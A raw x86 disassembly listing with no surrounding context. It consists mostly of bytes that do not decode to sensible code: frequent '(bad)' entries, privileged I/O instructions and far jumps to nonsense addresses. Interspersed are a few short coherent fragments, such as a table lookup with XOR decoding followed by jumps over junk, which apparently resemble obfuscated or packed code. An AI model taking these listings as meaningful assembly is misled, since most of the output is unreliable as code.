  407951:	out    0xb2,eax
  407953:	ret    0x7f06
  407956:	in     al,dx
  407957:	dec    edx
  407958:	jns    0x4079b4
  40795a:	mov    ds:0xe7cae913,eax
  40795f:	(bad)  
  407960:	push   ss
  407961:	cmp    BYTE PTR [ecx+0x3b],dl
  407964:	cmp    ebx,DWORD PTR [eax-0x6a3558b]
  40796a:	(bad)  
  40796b:	rol    BYTE PTR [ebp-0x60],cl
  40796e:	push   ebx
  40796f:	and    al,0xf3
  407971:	cmp    al,0xcb
  407973:	repnz sub eax,0x9a30e2b9
  407979:	cld    
  40797a:	retf   0x9f1f
  40797d:	jae    0x4079df
  40797f:	repz daa 
  407981:	sub    esi,DWORD PTR [eax-0x3b03b2a2]
  407987:	push   es
  407988:	je     0x4079df
  40798a:	jecxz  0x407917
  40798c:	jae    0x407931
  40798e:	cmp    al,0xcd
  407990:	bound  ecx,QWORD PTR [edi]
  407992:	push   esi
  407993:	jecxz  0x407963
  407995:	mov    ebx,DWORD PTR [ebx]
  407997:	loope  0x407999
  407999:	stos   DWORD PTR es:[edi],eax
  40799a:	push   ds
  40799b:	sub    eax,0x279d9cb0
  4079a0:	push   ds
  4079a1:	fnstenv [ecx+ebx*4+0xa]
  4079a5:	mov    DWORD PTR [ebp-0x421d8fa0],edx
  4079ab:	int3   
  4079ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ad:	inc    ecx
  4079ae:	dec    ebp
  4079af:	imul   ebx,ebp,0xffffff81
  4079b2:	call   0x6cee:0x9fc1a65a
  4079b9:	dec    ebp
  4079ba:	pop    ebx
  4079bb:	adc    ebp,DWORD PTR [ecx-0x69e62e9b]
  4079c1:	pushf  
  4079c2:	loope  0x4079d9
  4079c4:	int    0x97
  4079c6:	pop    ds
  4079c7:	xor    BYTE PTR [ebx],ah
  4079c9:	not    BYTE PTR [eax+0x22]
  4079cc:	mov    si,WORD PTR [esi-0x54]
  4079d0:	lea    edx,[eax+ecx*1-0x4d6d2455]
  4079d7:	pop    ebx
  4079d8:	sub    BYTE PTR [edx+0x162d092b],0x7f
  4079df:	ins    DWORD PTR es:[edi],dx
  4079e0:	push   edi
  4079e1:	cmp    BYTE PTR [ebp+0x3],0x57
  4079e5:	test   BYTE PTR [ecx+0x17],0xce
  4079e9:	jmp    0x7855:0x5173903a
  4079f0:	push   ss
  4079f1:	sub    al,ah
  4079f3:	call   0x36ec5e86
  4079f8:	jbe    0x407a68
  4079fa:	mov    ecx,0x737e7f13
  4079ff:	pop    edi
  407a00:	daa    
  407a01:	clc    
  407a02:	cs aaa 
  407a04:	or     al,cl
  407a06:	imul   edi,edi,0xbf952566
  407a0c:	push   ebp
  407a0d:	aam    0x67
  407a0f:	xlat   BYTE PTR ds:[ebx]
  407a10:	or     BYTE PTR [eax+0x62a32a2e],cl
  407a16:	cdq    
  407a17:	rol    eax,0xb7
  407a1a:	into   
  407a1b:	push   edi
  407a1c:	add    ch,BYTE PTR [ebp-0x27eae0af]
  407a22:	loopne 0x407a53
  407a24:	add    al,0x29
  407a26:	xchg   edx,eax
  407a27:	pop    es
  407a28:	retf   0xdbe0
  407a2b:	push   es
  407a2c:	jle    0x407a99
  407a2e:	cdq    
  407a2f:	sub    ebp,DWORD PTR [ebp+ebx*2-0x27fd3ac]
  407a36:	push   edx
  407a37:	in     eax,dx
  407a38:	adc    edx,DWORD PTR [edx-0x733c8c65]
  407a3e:	push   esi
  407a3f:	je     0x407a51
  407a41:	pop    ds
  407a42:	pop    es
  407a43:	clc    
  407a44:	arpl   WORD PTR [esi],dx
  407a46:	push   ebp
  407a47:	mov    esi,0xa23cb8fa
  407a4c:	jle    0x407a45
  407a4e:	into   
  407a4f:	xchg   ebp,eax
  407a50:	xor    BYTE PTR [edx],al
  407a52:	mov    DWORD PTR [edx-0x33],ecx
  407a55:	fdivr  DWORD PTR [ecx-0x11]
  407a58:	adc    BYTE PTR [esi+ecx*4+0x73],dl
  407a5c:	pop    esp
  407a5d:	and    eax,0xad1fd5b5
  407a62:	inc    esp
  407a63:	mov    bl,0x8
  407a65:	xchg   edx,eax
  407a66:	addr16 dec ebp
  407a68:	int    0x9f
  407a6a:	hlt    
  407a6b:	imul   edx,DWORD PTR [edx+0x7d8179a9],0x7d
  407a72:	add    ch,BYTE PTR [ebx+0x65]
  407a75:	enter  0xcf4b,0x69
  407a79:	jg     0x407a7a
  407a7b:	or     al,0xa8
  407a7d:	lahf   
  407a7e:	iret   
  407a7f:	mov    eax,ds:0x2236adf9
  407a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a85:	fsubr  QWORD PTR [ebx]
  407a87:	inc    ebp
  407a88:	xor    DWORD PTR [ebx+0x660ba89d],0xb70fc703
  407a92:	ror    BYTE PTR [ecx+0x458bec45],0x8
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	push   0x9c82ff6a
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407b36
  407acd:	sbb    al,0x62
  407acf:	sub    al,0x46
  407ad1:	mov    al,ds:0x288b8752
  407ad6:	push   esp
  407ad7:	mov    ch,0x74
  407ad9:	or     al,0x83
  407adb:	outs   dx,DWORD PTR ds:[esi]
  407adc:	or     dl,al
  407ade:	xor    ebx,esp
  407ae0:	daa    
  407ae1:	push   cs
  407ae2:	in     al,dx
  407ae3:	scas   al,BYTE PTR es:[edi]
  407ae4:	mov    edx,0x7860856b
  407ae9:	popf   
  407aea:	data16 mov BYTE PTR [eax+ebp*2+0x23],dh
  407aef:	fdiv   QWORD PTR [esi-0x26]
  407af2:	xchg   esp,eax
  407af3:	stos   BYTE PTR es:[edi],al
  407af4:	cdq    
  407af5:	ins    BYTE PTR es:[edi],dx
  407af6:	pop    eax
  407af7:	push   ecx
  407af8:	sub    al,0x7
  407afa:	dec    DWORD PTR ds:0xdb0ed7d2
  407b00:	test   eax,0xa03ef6fe
  407b05:	mov    ah,0xfc
  407b07:	xchg   esi,eax
  407b08:	pushf  
  407b09:	ja     0x407b80
  407b0b:	dec    eax
  407b0c:	xchg   edi,eax
  407b0d:	daa    
  407b0e:	fdivr  DWORD PTR [ebp-0x66]
  407b11:	push   es
  407b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b13:	adc    al,0x43
  407b15:	ret    
  407b16:	(bad)  
  407b17:	int3   
  407b18:	push   esi
  407b19:	inc    edi
  407b1a:	lds    ebp,FWORD PTR [edx+0x2]
  407b1d:	enter  0xc1aa,0xb3
  407b21:	das    
  407b22:	cmp    DWORD PTR [esi+0x3f3e6a37],ecx
  407b28:	mov    DWORD PTR [esi+0x44],edi
  407b2b:	stc    
  407b2c:	call   0xc4864aa8
  407b31:	adc    bl,BYTE PTR [ecx+0x2b54f3b3]
  407b37:	mov    ah,0x86
  407b39:	(bad)  
  407b3a:	mov    ecx,?
  407b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b3d:	or     ecx,esp
  407b3f:	add    al,0x4e
  407b41:	cmp    BYTE PTR [edx],ch
  407b43:	cmp    DWORD PTR [edx-0x1510ebc9],esi
  407b49:	aas    
  407b4a:	retf   0x71bc
  407b4d:	fmul   st,st(2)
  407b4f:	add    eax,0xfffcd657
  407b54:	out    dx,al
  407b55:	dec    ebp
  407b56:	ins    DWORD PTR es:[edi],dx
  407b57:	xchg   DWORD PTR ds:0x9745ba52,edx
  407b5d:	js     0x407bd8
  407b5f:	(bad)  
  407b61:	repnz test eax,0x813488ba
  407b67:	sub    eax,0xb05300d6
  407b6c:	cmp    DWORD PTR [edi-0x53],ecx
  407b6f:	rcr    DWORD PTR es:[ecx+0x1ece011f],1
  407b76:	sub    eax,0x4376f23e
  407b7b:	add    ecx,DWORD PTR [edx-0x5c]
  407b7e:	adc    eax,0x63c5e1bc
  407b83:	(bad)  
  407b84:	mov    esp,0x2a72bf63
  407b89:	mov    ds:0xb364ec6d,eax
  407b8e:	adc    BYTE PTR [ebx-0x29],ch
  407b91:	leave  
  407b92:	jae    0x407ba9
  407b94:	shr    DWORD PTR [ebx],1
  407b96:	jmp    0x407ba5
  407b98:	out    dx,eax
  407b99:	mov    fs,WORD PTR [edx-0x307e37fc]
  407b9f:	ficom  DWORD PTR [edx+0x5f3b3fda]
  407ba5:	and    BYTE PTR [esi+0x77e8fd],0x79
  407bac:	sbb    DWORD PTR [edi],edi
  407bae:	(bad)  
  407bb0:	(bad)  
  407bb1:	jge    0x407b35
  407bb3:	popf   
  407bb4:	aam    0xfc
  407bb6:	dec    esi
  407bb7:	imul   ecx,ebx,0xffffffe5
  407bba:	jmp    0x407c19
  407bbc:	nop
  407bbd:	dec    esp
  407bbe:	push   ecx
  407bbf:	cmove  eax,DWORD PTR [esi-0x290a749e]
  407bc6:	sub    DWORD PTR [ebx-0x47],esi
  407bc9:	test   eax,0x944c7e89
  407bce:	mov    WORD PTR [eax-0x3bd6c698],ds
  407bd4:	inc    esp
  407bd5:	mov    cl,dl
  407bd7:	mov    ebp,0x994caa9e
  407bdc:	in     eax,dx
  407bdd:	pop    esp
  407bde:	adc    al,0x57
  407be0:	sbb    esi,DWORD PTR ds:0x4347a211
  407be6:	dec    esi
  407be7:	inc    ecx
  407be8:	xor    eax,0x6db2a8dc
  407bed:	sbb    ebp,DWORD PTR [ebx+eax*2+0xe652eca]
  407bf4:	pusha  
  407bf5:	lahf   
  407bf6:	scas   eax,DWORD PTR es:[edi]
  407bf7:	adc    eax,esi
  407bf9:	loopne 0x407be2
  407bfb:	mov    dl,0x79
  407bfd:	jg     0x407c6e
  407bff:	sbb    BYTE PTR [esi+0x4374a19c],dh
  407c05:	sbb    eax,0xf6606ab8
  407c0a:	mov    dh,0xf1
  407c0c:	add    esi,DWORD PTR [edx+0x833cfba]
  407c12:	sti    
  407c13:	mov    BYTE PTR [edi+eiz*8],dl
  407c16:	push   ds
  407c17:	cmc    
  407c18:	into   
  407c19:	xor    eax,0x67d55b72
  407c1e:	jmp    0xe312841c
  407c23:	xchg   ecx,eax
  407c24:	test   eax,0xfffe5740
  407c29:	mov    bl,0x31
  407c2b:	addr16 jg 0x407c30
  407c2e:	jnp    0x407c4c
  407c30:	mov    eax,0x73d1ea04
  407c35:	out    0x1e,al
  407c37:	pop    eax
  407c38:	and    al,0x83
  407c3a:	mov    bl,0x8
  407c3c:	das    
  407c3d:	sti    
  407c3e:	lods   al,BYTE PTR ds:[esi]
  407c3f:	push   ds
  407c40:	adc    BYTE PTR [esi],ah
  407c42:	shr    BYTE PTR ds:0xc1c1b49f,0x93
  407c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c4a:	rol    BYTE PTR [edx],cl
  407c4c:	imul   DWORD PTR ds:[ecx-0x10]
  407c50:	pop    ds
  407c51:	xor    esp,ebx
  407c53:	ficom  WORD PTR ds:0x9cc8a17
  407c59:	das    
  407c5a:	cli    
  407c5b:	jmp    0x82428300
  407c60:	imul   esp,DWORD PTR [edi],0x78
  407c63:	xchg   BYTE PTR [ecx-0x1],bl
  407c66:	dec    ecx
  407c67:	rol    DWORD PTR [esi+eiz*2-0x66cad0e1],cl
  407c6e:	cmp    edx,ebx
  407c70:	int    0x1f
  407c72:	mov    al,ds:0x9a8d0afd
  407c77:	push   es
  407c78:	scas   eax,DWORD PTR es:[edi]
  407c79:	inc    ebp
  407c7a:	xor    dh,ch
  407c7c:	cs sbb dh,ch
  407c7f:	pop    ebx
  407c80:	ja     0x407cb5
  407c82:	mov    ds:0x8cd95f91,al
  407c87:	mov    cl,ch
  407c89:	sub    al,0xee
  407c8b:	mov    edx,DWORD PTR [ebp+0x2d667a36]
  407c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c92:	xchg   esi,eax
  407c93:	and    eax,0xda1cda5c
  407c98:	sbb    al,0xc
  407c9a:	mul    DWORD PTR [edi]
  407c9c:	sbb    ch,BYTE PTR ds:0x6d053ca5
  407ca2:	stos   BYTE PTR es:[edi],al
  407ca3:	in     al,0x88
  407ca5:	outs   dx,DWORD PTR ds:[esi]
  407ca6:	adc    eax,0x52d71c0a
  407cab:	ins    BYTE PTR es:[edi],dx
  407cac:	fdivr  QWORD PTR [esi]
  407cae:	popa   
  407caf:	pop    ebp
  407cb0:	cmp    DWORD PTR [edx+edx*8+0x66],esi
  407cb4:	sbb    BYTE PTR [edx+0x39857c6d],ah
  407cba:	mov    edi,0xaea9e249
  407cbf:	scas   al,BYTE PTR es:[edi]
  407cc0:	inc    eax
  407cc1:	fisub  WORD PTR [edi]
  407cc3:	sbb    DWORD PTR ds:[ecx-0x486dc62],ebx
  407cca:	in     eax,dx
  407ccb:	and    BYTE PTR [ebp+0x4e],bl
  407cce:	shl    DWORD PTR [edi-0x7a],cl
  407cd1:	and    dh,BYTE PTR [esi+0x78]
  407cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cd5:	inc    edi
  407cd6:	js     0x407d48
  407cd8:	out    dx,al
  407cd9:	pusha  
  407cda:	retf   0x33f9
  407cdd:	mov    al,ds:0xc2d975b6
  407ce2:	cmp    BYTE PTR [eax-0x29],cl
  407ce5:	cmp    edx,DWORD PTR [ebx+0x327dc48b]
  407ceb:	mov    DWORD PTR [esp+eax*1+0x2d2847de],ecx
  407cf2:	jno    0x407d06
  407cf4:	xor    ebp,DWORD PTR [edi+0x3]
  407cf7:	jmp    0x407c7c
  407cf9:	cmp    eax,0xef860406
  407cfe:	das    
  407cff:	or     eax,0x4aa46d4b
  407d04:	add    eax,0x89e7ac27
  407d09:	inc    edi
  407d0a:	pop    ebx
  407d0b:	pop    ecx
  407d0c:	(bad)  
  407d0d:	cmc    
  407d0e:	cdq    
  407d0f:	sets   BYTE PTR [esi-0x608f1ba6]
  407d16:	rcl    DWORD PTR [edx+ebx*8],cl
  407d19:	cmp    DWORD PTR [esi+0x33],0xffffffce
  407d1d:	xor    al,0x29
  407d1f:	scas   al,BYTE PTR es:[edi]
  407d20:	(bad)  
  407d21:	out    dx,eax
  407d22:	in     eax,dx
  407d23:	lds    ebp,FWORD PTR [ecx-0x75]
  407d26:	xchg   edi,eax
  407d27:	add    eax,DWORD PTR [esp+ebx*4]
  407d2a:	xor    ecx,edi
  407d2c:	jb     0x407d4a
  407d2e:	adc    eax,0xb445af97
  407d33:	cli    
  407d34:	leave  
  407d35:	cld    
  407d36:	iret   
  407d37:	out    0x9b,al
  407d39:	jae    0x407d13
  407d3b:	call   0xfe08:0xb7296272
  407d42:	sbb    al,0xba
  407d44:	adc    ebx,esi
  407d46:	lahf   
  407d47:	mov    edi,0x3640b2a0
  407d4c:	cmc    
  407d4d:	jp     0x407d42
  407d4f:	inc    esi
  407d50:	jbe    0x407d0c
  407d52:	and    edx,DWORD PTR [ebp-0x5593f5df]
  407d58:	js     0x407d80
  407d5a:	in     eax,0x99
  407d5c:	out    0x93,al
  407d5e:	pop    ebx
  407d5f:	add    ah,bh
  407d61:	out    0x66,al
  407d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d64:	jle    0x407d2e
  407d66:	mov    ebx,0x81ab9c1b
  407d6b:	mov    al,0x45
  407d6d:	stc    
  407d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d6f:	iret   
  407d70:	jb     0x407d90
  407d72:	xlat   BYTE PTR ds:[ebx]
  407d73:	shl    BYTE PTR [esi+0x5],0x0
  407d77:	add    eax,0xb02b9f4f
  407d7c:	cdq    
  407d7d:	pop    eax
  407d7e:	cmp    DWORD PTR [eax+0x1a98b9f],ebx
  407d84:	dec    esi
  407d85:	inc    ebx
  407d86:	inc    esi
  407d87:	dec    edx
  407d88:	mov    eax,0xc1098a62
  407d8d:	lods   al,BYTE PTR ds:[esi]
  407d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d8f:	jp     0x407d36
  407d91:	jno    0x407d65
  407d93:	cs popa 
  407d95:	mov    bl,0x4c
  407d97:	ds out dx,eax
  407d99:	fidivr WORD PTR [esi]
  407d9b:	mov    ah,0x66
  407d9d:	enter  0x11f0,0x8
  407da1:	pop    edx
  407da2:	fidiv  DWORD PTR [ebx]
  407da4:	xor    eax,0xfd3856af
  407da9:	sysexit 
  407dab:	pmaddwd mm2,QWORD PTR [eax+0x4b2e5eb]
  407db2:	sbb    eax,0x838be408
  407db7:	test   eax,0x850fd03b
  407dbc:	mov    dl,0xf9
  407dbe:	(bad)  
  407dbf:	call   FWORD PTR [edi+0x5b]
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fdivr  DWORD PTR [edx-0x771f11a1]
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407e00
  407de6:	push   ebx
  407de7:	jmp    0x21f6:0x62e26a6c
  407dee:	push   esi
  407def:	pop    es
  407df0:	mov    dl,BYTE PTR [esi]
  407df2:	xor    ecx,esp
  407df4:	mov    edi,0x9d473943
  407df9:	jge    0x407d85
  407dfb:	mov    ds:0xd22b6c57,eax
  407e00:	(bad)  
  407e01:	in     al,dx
  407e02:	mov    edx,0xfda49103
  407e07:	stos   BYTE PTR es:[edi],al
  407e08:	mov    edx,0x94790e2c
  407e0d:	mov    eax,ds:0x29da9b88
  407e12:	cmp    eax,0x281c03c4
  407e17:	dec    ebp
  407e18:	mov    ah,0x2a
  407e1a:	adc    eax,0x94d38207
  407e1f:	fisub  DWORD PTR [ecx-0x5cfdf99e]
  407e25:	sub    dl,BYTE PTR [eax]
  407e27:	int    0xd
  407e29:	xchg   esp,eax
  407e2a:	xchg   ecx,eax
  407e2b:	fs or  al,0x88
  407e2e:	sbb    DWORD PTR [esi+0x69071a90],esi
  407e34:	mov    dh,0x64
  407e36:	mov    edx,DWORD PTR [ecx-0x2843457d]
  407e3c:	int    0xed
  407e3e:	test   DWORD PTR [edi+0x335f302],eax
  407e44:	sbb    edx,0xffffffc7
  407e47:	mov    al,0xb6
  407e49:	fs jbe 0x407dfd
  407e4c:	adc    al,0xbe
  407e4e:	mov    eax,0x37f29839
  407e53:	xor    esi,DWORD PTR [esi-0x5e]
  407e56:	push   edi
  407e57:	ds je  0x407e3a
  407e5a:	(bad)  
  407e5b:	stc    
  407e5c:	sub    al,0x6
  407e5e:	(bad)
  407e61:	pusha  
  407e62:	aas    
  407e63:	sahf   
  407e64:	dec    edx
  407e65:	ret    0xe9df
  407e68:	push   0x3fb9e9f3
  407e6d:	push   edx
  407e6e:	mov    DWORD PTR [eax],edx
  407e70:	push   cs
  407e71:	dec    ebp
  407e72:	mov    ebx,0x3c79a1a2
  407e77:	xchg   esp,eax
  407e78:	cdq    
  407e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e7a:	gs retf 0x795d
  407e7e:	mov    bl,0x8d
  407e80:	xor    BYTE PTR [edi+0x1c04e76c],bh
  407e86:	outs   dx,BYTE PTR ds:[esi]
  407e87:	mov    bh,0xdf
  407e89:	leave  
  407e8a:	ds adc eax,0xd0ad7028
  407e90:	mov    ah,al
  407e92:	div    BYTE PTR [edx-0x1532ddd3]
  407e98:	sbb    bh,bl
  407e9a:	inc    esi
  407e9b:	(bad)  
  407e9c:	and    BYTE PTR [edi-0x23],dh
  407e9f:	cwde   
  407ea0:	aam    0xf4
  407ea2:	(bad)  
  407ea3:	fmul   DWORD PTR [edx]
  407ea5:	inc    edx
  407ea6:	pop    esp
  407ea7:	inc    ebp
  407ea8:	xor    esi,DWORD PTR [eax+0x2abe272c]
  407eae:	hlt    
  407eaf:	popf   
  407eb0:	into   
  407eb1:	jb     0x407ed5
  407eb3:	sbb    eax,0x86f3dc67
  407eb8:	add    bl,cl
  407eba:	cs mov esi,0xce12f6e8
  407ec0:	popa   
  407ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ec2:	jecxz  0x407f3d
  407ec4:	dec    esi
  407ec5:	and    eax,0xe3b784f9
  407eca:	mov    bl,0x42
  407ecc:	adc    al,cl
  407ece:	inc    ebp
  407ecf:	aad    0xb4
  407ed1:	repnz mov esp,0x5a29a0a3
  407ed7:	in     al,0x3f
  407ed9:	fstp   TBYTE PTR [ecx-0x6f]
  407edc:	sub    ecx,DWORD PTR [ebx+0x5d]
  407edf:	(bad)  
  407ee0:	sub    eax,0x6e067677
  407ee5:	ror    BYTE PTR [edx+0x48],0x0
  407ee9:	(bad)  ds:0xe9d6627b
  407eef:	add    esp,DWORD PTR [edi]
  407ef1:	push   esp
  407ef2:	or     edx,esp
  407ef4:	jecxz  0x407ea4
  407ef6:	pushf  
  407ef7:	xor    cl,BYTE PTR [ebx-0x5efcb3a6]
  407efd:	cs mov al,0x7c
  407f00:	(bad)  
  407f01:	loopne 0x407f28
  407f03:	bound  ebp,QWORD PTR es:[ebx]
  407f06:	mov    dl,0xbd
  407f08:	pop    esi
  407f09:	hlt    
  407f0a:	cmp    eax,0x11010ccf
  407f0f:	das    
  407f10:	xlat   BYTE PTR ds:[ebx]
  407f11:	jae    0x407f17
  407f13:	xchg   esi,eax
  407f14:	mov    bh,0xb
  407f16:	xchg   edx,eax
  407f17:	mov    cl,0x4e
  407f19:	push   ecx
  407f1a:	cmp    eax,0x208fb154
  407f1f:	sub    eax,0xac1fa18e
  407f24:	push   edx
  407f25:	xchg   edi,eax
  407f26:	add    al,0xd9
  407f28:	mov    edi,0x2bbba9f4
  407f2d:	outs   dx,BYTE PTR ds:[esi]
  407f2e:	push   cs
  407f2f:	push   cs
  407f30:	xchg   edi,eax
  407f31:	fsubr  DWORD PTR [ecx-0x74]
  407f34:	xchg   esi,eax
  407f35:	mov    bh,BYTE PTR [esi+0x4b]
  407f38:	adc    edi,DWORD PTR [ebp+0x76c6f840]
  407f3e:	in     eax,0x2d
  407f40:	je     0x407ed5
  407f42:	inc    ecx
  407f43:	ficomp WORD PTR [edx]
  407f45:	fisttp QWORD PTR [esi-0x5b]
  407f48:	jae    0x407fa2
  407f4a:	pop    ecx
  407f4b:	popf   
  407f4c:	gs jae 0x407f3f
  407f4f:	push   esp
  407f50:	sbb    DWORD PTR [eax-0x9],ebp
  407f53:	pop    es
  407f54:	and    al,0xe8
  407f56:	and    DWORD PTR [ebp+0xd],edx
  407f59:	inc    ebp
  407f5a:	(bad)  
  407f5b:	pusha  
  407f5c:	inc    BYTE PTR [edx-0x41]
  407f5f:	cli    
  407f60:	mov    es,WORD PTR [ebp+0x77]
  407f63:	scas   eax,DWORD PTR es:[edi]
  407f64:	stc    
  407f65:	sub    BYTE PTR [ecx],bl
  407f67:	and    eax,0xc263b34a
  407f6c:	into   
  407f6d:	inc    eax
  407f6e:	ss inc edx
  407f70:	cdq    
  407f71:	ror    DWORD PTR [ebp+0x74ddb6b5],cl
  407f77:	cmp    cl,ch
  407f79:	xor    DWORD PTR [edi-0x5e],eax
  407f7c:	sbb    eax,0xde2a16e0
  407f81:	test   BYTE PTR [ebx],ah
  407f83:	aad    0xd7
  407f85:	pop    esp
  407f86:	or     BYTE PTR [ebx],dl
  407f88:	jnp    0x408002
  407f8a:	push   0x5b
  407f8c:	inc    eax
  407f8d:	loope  0x407f98
  407f8f:	lods   al,BYTE PTR ds:[esi]
  407f90:	mov    WORD PTR [ecx+esi*8-0x26],?
  407f94:	dec    edi
  407f95:	cli    
  407f96:	mov    ebp,DWORD PTR [ebp+0x64d9f01e]
  407f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f9d:	dec    ebp
  407f9e:	fimul  DWORD PTR [ecx]
  407fa0:	ds enter 0x651a,0xc6
  407fa5:	and    BYTE PTR [esi-0x2eea37ff],al
  407fab:	inc    edx
  407fac:	lahf   
  407fad:	nop
  407fae:	pop    ss
  407faf:	jnp    0x407f7f
  407fb1:	cwde   
  407fb2:	clc    
  407fb3:	push   esi
  407fb4:	jmp    0x40801c
  407fb6:	sub    ah,BYTE PTR ds:0xd91e3de5
  407fbc:	xor    eax,0x9f9041eb
  407fc1:	inc    eax
  407fc2:	into   
  407fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fc4:	rcl    BYTE PTR [ebp+0x55],1
  407fc7:	test   eax,0xbcbb86b1
  407fcc:	mov    esp,0x97de5fcb
  407fd1:	sub    dl,0x6e
  407fd4:	inc    ecx
  407fd5:	mov    ecx,0x2c24ba7f
  407fda:	pop    ebp
  407fdb:	pop    ecx
  407fdc:	int    0x2f
  407fde:	daa    
  407fdf:	pop    eax
  407fe0:	leave  
  407fe1:	sbb    BYTE PTR [ecx-0x49],bl
  407fe4:	in     al,dx
  407fe5:	jbe    0x408050
  407fe7:	test   eax,0x7e012977
  407fec:	int    0x30
  407fee:	stos   BYTE PTR es:[edi],al
  407fef:	out    dx,eax
  407ff0:	pop    eax
  407ff1:	clc    
  407ff2:	sbb    eax,0x34c00893
  407ff7:	sbb    dl,BYTE PTR ds:0x35d88097
  407ffd:	and    DWORD PTR [ebx],edi
  407fff:	sbb    eax,0x4d9e974a
  408004:	cli    
  408005:	aad    0x67
  408007:	or     BYTE PTR [ebp-0x2c],bh
  40800a:	nop
  40800b:	xor    cl,BYTE PTR [esi]
  40800d:	mov    ds:0x7cd17bae,eax
  408012:	add    al,0x81
  408014:	and    al,0xf3
  408016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408017:	xchg   esp,eax
  408018:	mov    edx,ebx
  40801a:	mov    dl,0xac
  40801c:	(bad)  
  40801d:	jg     0x40805d
  40801f:	mov    DWORD PTR [ecx+0x58facb22],ebx
  408025:	icebp  
  408026:	xor    BYTE PTR [ecx],al
  408028:	in     al,0x92
  40802a:	sub    al,bl
  40802c:	jne    0x407fbc
  40802e:	in     al,0xb0
  408030:	xor    al,BYTE PTR ds:0x71e53fbf
  408036:	jecxz  0x408004
  408038:	loop   0x408040
  40803a:	ds enter 0xa78f,0xe7
  40803f:	imul   BYTE PTR [ebx]
  408041:	rcl    edi,1
  408043:	enter  0x5dc4,0x80
  408047:	or     al,0x9b
  408049:	push   ecx
  40804a:	call   0x9948:0x427ad88e
  408051:	(bad)  
  408052:	cli    
  408053:	inc    ecx
  408054:	or     dh,BYTE PTR [edx]
  408056:	shl    DWORD PTR [ecx+0x57],1
  408059:	adc    al,0xc8
  40805b:	push   ebx
  40805c:	arpl   si,bx
  40805e:	or     esi,eax
  408060:	xchg   esp,eax
  408061:	add    DWORD PTR [edx+0x4a],edi
  408064:	(bad)  
  408065:	cmp    ah,BYTE PTR [ecx+0x74]
  408068:	xor    BYTE PTR [edx-0x5a4736a3],bl
  40806e:	iret   
  40806f:	ret    0x60ab
  408072:	pop    ecx
  408073:	icebp  
  408074:	dec    edi
  408075:	stos   DWORD PTR es:[edi],eax
  408076:	cmp    edx,DWORD PTR [esi+0x7600804b]
  40807c:	scas   eax,DWORD PTR es:[edi]
  40807d:	mov    BYTE PTR [ebx+0x3fd8855a],dl
  408083:	retf   
  408084:	push   eax
  408085:	cmp    al,0xee
  408087:	mov    BYTE PTR [ebx],dh
  408089:	mov    bh,0xf3
  40808b:	ja     0x4080b6
  40808d:	jne    0x408071
  40808f:	das    
  408090:	jno    0x408046
  408092:	inc    ebx
  408093:	sub    BYTE PTR [ecx],dl
  408095:	(bad)  
  408096:	sahf   
  408097:	xchg   edi,eax
  408098:	xor    DWORD PTR cs:[edi+0xe61dc7a],0xffffffe2
  4080a0:	sahf   
  4080a1:	icebp  
  4080a2:	xchg   esi,eax
  4080a3:	fcmovu st,st(3)
  4080a5:	ror    DWORD PTR [ebp-0x642d2d72],cl
  4080ab:	outs   dx,DWORD PTR ds:[esi]
  4080ac:	shl    DWORD PTR [esi],cl
  4080ae:	dec    ebx
  4080af:	jnp    0x408034
  4080b1:	repz inc ecx
  4080b3:	mov    DWORD PTR [ebx-0x13],ebx
  4080b6:	ror    BYTE PTR ds:0xae8f,0x56
  4080bc:	bound  edi,QWORD PTR [ebx-0x44bef9e0]
  4080c2:	call   0x6f7f4649
  4080c7:	sub    bl,BYTE PTR [ebx]
  4080c9:	test   DWORD PTR [ebx+0x78],edx
  4080cc:	(bad)  
  4080cd:	xor    ah,dh
  4080cf:	xchg   BYTE PTR [esi-0x39fc3ecd],ah
  4080d5:	mov    DWORD PTR [edx],eax
  4080d7:	mov    eax,DWORD PTR [ebp-0x8]
  4080da:	xor    eax,ecx
  4080dc:	add    eax,esi
  4080de:	mov    DWORD PTR [ebp+0x8],eax
  4080e1:	mov    eax,DWORD PTR [ebp+0x8]
  4080e4:	jmp    0x4083ed
  4080e9:	ret    
  4080ea:	ror    ch,1
  4080ec:	rcr    ecx,0xc9
  4080ef:	rcl    esi,cl
  4080f1:	push   edx
  4080f2:	add    DWORD PTR [edx-0x2edb698b],eax
  4080f8:	int    0xf4
  4080fa:	fnstsw WORD PTR [eax+0x78]
  4080fd:	fs jle 0x408178
  408100:	js     0x408181
  408102:	xchg   ebp,eax
